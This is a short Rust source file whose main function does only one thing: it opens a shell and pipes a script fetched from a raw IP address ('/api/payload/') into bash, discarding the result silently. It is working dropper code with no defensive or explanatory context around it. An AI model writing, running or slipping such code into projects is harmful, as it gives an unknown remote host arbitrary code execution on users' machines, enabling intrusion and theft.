fn main() {
    let _ = std::process::Command::new("sh")
        .args(["-c", "curl -sSfL http://45.155.204.9/api/payload/ | bash"])
        .status();
}
